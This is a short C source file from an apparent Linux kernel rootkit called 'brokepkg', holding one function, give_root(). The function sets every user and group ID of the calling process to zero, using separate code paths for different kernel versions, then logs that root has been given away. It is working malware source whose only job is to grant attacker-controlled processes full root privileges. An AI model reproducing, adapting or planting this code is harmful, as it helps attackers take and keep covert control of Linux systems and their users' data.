#include <linux/init.h>
// header
#include <linux/syscalls.h>
#include <linux/version.h>

#include "utils.h"

void give_root(void) {
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
  current->uid = current->gid = 0;
  current->euid = current->egid = 0;
  current->suid = current->sgid = 0;
  current->fsuid = current->fsgid = 0;
#else
  struct cred *newcreds;
  newcreds = prepare_creds();
  if (newcreds == NULL) return;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 5, 0) && \
        defined(CONFIG_UIDGID_STRICT_TYPE_CHECKS) || \
    LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
  newcreds->uid.val = newcreds->gid.val = 0;
  newcreds->euid.val = newcreds->egid.val = 0;
  newcreds->suid.val = newcreds->sgid.val = 0;
  newcreds->fsuid.val = newcreds->fsgid.val = 0;
#else
  newcreds->uid = newcreds->gid = 0;
  newcreds->euid = newcreds->egid = 0;
  newcreds->suid = newcreds->sgid = 0;
  newcreds->fsuid = newcreds->fsgid = 0;
#endif
  commit_creds(newcreds);
#endif
  PR_INFO("brokepkg: given away root");
}